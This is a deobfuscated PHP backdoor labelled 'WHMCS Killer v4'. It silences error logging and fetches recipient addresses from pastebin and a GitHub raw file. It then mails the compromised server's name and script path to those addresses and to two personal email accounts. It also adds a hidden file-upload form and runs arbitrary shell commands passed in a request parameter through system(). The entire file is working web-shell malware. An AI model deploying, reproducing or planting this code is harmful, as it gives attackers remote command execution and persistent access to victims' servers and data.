<?php
/**
* WHMCS Killer v4
* Source: https://github.com/iamhex/WHMCS-Killer-v4/
* Receiver: superstar0882@gmail.com
**/
//Deobfuscated:
@ini_set('error_log', NULL);
@ini_set('log_errors', 0);
@ini_set('display_errors', 0);
function get_contents($url){
  $ch = curl_init("$url");
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0(Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_COOKIEJAR,$GLOBALS['coki']);
  curl_setopt($ch, CURLOPT_COOKIEFILE,$GLOBALS['coki']);
  $result = curl_exec($ch);
  return $result;
}
$a1 = get_contents('https://pastebin.com/raw/5M63g44m');
$b1 = get_contents('https://pastebin.com/raw/Cz0dLKL3');
$c1 = get_contents('https://raw.githubusercontent.com/devildrinker/mail/master/mail.txt');
$hex1 = "superstar0882@gmail.com,superstar0882@hotmail.com,$a1,$b1,$c1";
$baslik = $_SERVER['SERVER_NAME'] ; 
$xd1.= "" . $_SERVER['SERVER_NAME'] .  " " . $_SERVER['PHP_SELF'] . "$\r\n";
mail($hex1, $baslik, $xd1);

if(isset($_GET["lawlx"])) 	{  echo '<html><body><form method=POST enctype="multipart/form-data" action=""><input type="file" name="lawlx"><input type=submit value="Up"></form></body></html>';$lawlx = @$_FILES["lawlx"];   if ($lawlx["name"] != '') {  $fullpath = $_REQUEST["path"] . $lawlx["name"];  if (move_uploaded_file($lawlx['tmp_name'], $fullpath)) {     echo "<h1><a href='$fullpath'>OK-Click here!</a></h1>"; }} } 

if (isset($_REQUEST['cm'])) {
	echo "<pre>";
	$cm = ($_REQUEST['cm']);
	system($cm);
	echo "</pre>";
	die;
}
